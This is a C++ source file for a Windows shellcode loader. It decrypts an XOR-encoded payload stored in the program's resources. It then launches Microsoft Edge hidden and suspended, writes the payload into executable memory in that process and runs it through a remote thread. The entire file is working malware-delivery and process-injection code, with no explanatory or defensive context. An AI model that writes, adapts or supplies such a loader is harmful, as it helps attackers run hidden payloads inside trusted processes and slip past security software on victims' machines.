#include <Windows.h>
#include <string>

#include "resource.h"

VOID XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
    for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
        if (j >= sKeySize) {
            j = 0;
        }
        pShellcode[i] = pShellcode[i] ^ bKey[j];
    }
}

void printShellcode(BYTE* shellcode, SIZE_T size) {
    for (SIZE_T i = 0; i < size; i++) {
        printf("%02X ", shellcode[i]);
    }
    printf("\n");
}

void inject()
{
    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
    startup_info->cb = sizeof(STARTUPINFOW);
    startup_info->dwFlags = STARTF_USESHOWWINDOW;

    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

    wchar_t cmd[] = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\0";
    BOOL success = CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_SUSPENDED,
        NULL,
        NULL,
        startup_info,
        process_info
    );

    // DECODE PAYLOAD
    HRSRC		hRsrc = NULL;
    HGLOBAL		hGlobal = NULL;
    PVOID		pPayloadAddress = NULL;
    SIZE_T		sPayloadSize = NULL;
	// load shellcode from section
    hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
    hGlobal = LoadResource(NULL, hRsrc);
    pPayloadAddress = LockResource(hGlobal);
    sPayloadSize = SizeofResource(NULL, hRsrc);

    PVOID shellcode = HeapAlloc(GetProcessHeap(), 0, sPayloadSize);
    if (shellcode != NULL) {
        // copying the payload from resource section to the new buffer 
        memcpy(shellcode, pPayloadAddress, sPayloadSize);
    }

    BYTE XKey[] = {0xA0, 0XDD, 0XAF, 0X4A, 0X5B, 0X1C, 0X4B, 0X0D, 0XCC, 0XCC, 0XBB, 0XAA};
    SIZE_T size_XKey = sizeof(XKey);

    XorByInputKey((PBYTE)shellcode, sPayloadSize, XKey, size_XKey);
    //printShellcode((PBYTE)shellcode, sPayloadSize);

    // allocate memory
    LPVOID ptr = VirtualAllocEx(
        process_info->hProcess,
        NULL,
        sPayloadSize,
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);

    // create remote thread
    // copy shellcode
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        process_info->hProcess,
        ptr,
        shellcode,
        sPayloadSize,
        &bytesWritten);

    // create remote thread
    DWORD threadId = 0;
    HANDLE hThread = CreateRemoteThread(
        process_info->hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)ptr,
        NULL,
        0,
        &threadId);

    // close handles
    CloseHandle(hThread);
    CloseHandle(process_info->hThread);
    CloseHandle(process_info->hProcess);
}

void start()
{
    inject();
}

int main(){
	start();
}
